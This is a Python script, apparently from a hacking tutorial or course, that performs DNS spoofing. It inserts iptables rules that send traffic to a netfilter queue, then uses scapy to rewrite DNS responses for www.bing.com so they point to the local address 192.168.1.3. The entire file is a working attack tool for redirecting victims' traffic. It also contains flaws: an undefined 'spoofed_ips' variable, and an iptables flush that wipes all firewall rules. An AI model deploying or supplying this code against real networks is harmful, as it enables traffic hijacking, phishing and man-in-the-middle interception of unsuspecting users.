#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
import sys, os, subprocess

def root_check():
    if os.geteuid() != 0:
        sys.exit("[!] This script must run as root")
    else:
        print("[*] Welcome to the DNS Spoofer.")

def iptable_insert():
    try:
        subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
        subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
        print("[*] Iptables forwarding rule inserted")
    except Exception as e:
        print(f"[!] Error inserting iptables rule: {e}")

def iptable_flush():
    try:
        subprocess.run(['iptables', '--flush'], check=True)
        print("[*] Iptables forwarding rule deleted")
    except Exception as e:
        print(f"[!] Error flushing iptables: {e}")

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname.decode():
            print(scapy_packet.show())
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.3")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet))

    packet.accept()

if __name__ == "__main__":
    iptable_insert()
    # create the object, bind to the iptables command and run
    queue = netfilterqueue.NetfilterQueue()

    try:
        queue.bind(1337, process_packet)
        try:
            print("[*] Starting packet interception. Press Ctrl+C to stop.")
            queue.run()
        except KeyboardInterrupt:
            print("\n[!] User Interruption detected. Exiting gracefully.")
            print("\n[*] Spoofed IP addresses:")
            for ip in spoofed_ips:
                print(f"\n - {ip}")
            iptable_flush()
        except Exception as e:
            print(f"[!] An error has occurred running NSQUEU: {e}")
    except Exception as e:
        print(f"[!] An error has occurred binding NSQUEU: {e}")
